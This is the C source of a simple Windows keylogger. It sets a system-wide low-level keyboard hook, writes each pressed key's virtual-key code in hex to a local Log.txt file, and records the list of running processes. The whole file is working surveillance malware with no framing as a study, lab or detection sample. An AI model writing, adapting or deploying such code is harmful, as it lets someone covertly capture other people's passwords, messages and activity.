#include <stdio.h>
#include <windows.h>
#include <winuser.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include <tchar.h>
LRESULT CALLBACK KeyboardProc(int input, WPARAM wParam, LPARAM lParam){
	//open file
	FILE *file;
	file = fopen("Log.txt","a");
	
	KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
	if(wParam == WM_KEYDOWN){
		DWORD keycode = kbd->vkCode;
		//if VK code is enter key, log it and add new line to log file
		if(keycode == VK_RETURN){
			fprintf(file,"0x0D [ENTER]\n");
		}else{
			//else just convert the VK code to hex and log
			int decimal = (int)keycode;
		
		int quotient,remainder;
		quotient = decimal;
		char hex[10];
		int i,j = 0;
		while(quotient !=0){
			remainder = quotient %16;
			if(remainder < 10){
				hex[j++] = 48 + remainder;
			}else{
				hex[j++] = 55 + remainder;
			}
			quotient = quotient / 16;
		}
		fprintf(file,"0x");
		for(i=j-1;i>=0;i--){
			fprintf(file,"%c",hex[i]);
		}
		fprintf(file," ");
		}
		
	}
	fclose(file);
	return 0;
}

BOOL GetProcess(){
	HANDLE SnapShot;
	PROCESSENTRY32 processentry;
	FILE *file;
	file = fopen("Log.txt","a");
	SnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if(SnapShot == INVALID_HANDLE_VALUE){
		fprintf(file,"Error, unable to get System Snapshot");
		fclose(file);
		return( FALSE );
	}
	processentry.dwSize = sizeof( PROCESSENTRY32 );
	if( !Process32First( SnapShot, &processentry ) )
  	{
     fprintf(file,"Error, unable to get information about system process");
     CloseHandle(SnapShot );
     fclose(file);
     return( FALSE );
  	}
  	fprintf(file,"Running Programs ===========================");
  	while(Process32Next(SnapShot,&processentry)){
  		fprintf(file,("\n%s"), processentry.szExeFile );
	  }
	fprintf(file,"\n============================================\n");
	CloseHandle(SnapShot);
	fclose(file);
	return(TRUE);
}

int main(){
	//Set up windows message hook.
	MSG msg;
	HHOOK Hook;
	Hook = SetWindowsHookEx(WH_KEYBOARD_LL,KeyboardProc,NULL,0);
	GetProcess();
	//loop 
	 while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(Hook);
    return 0;
}
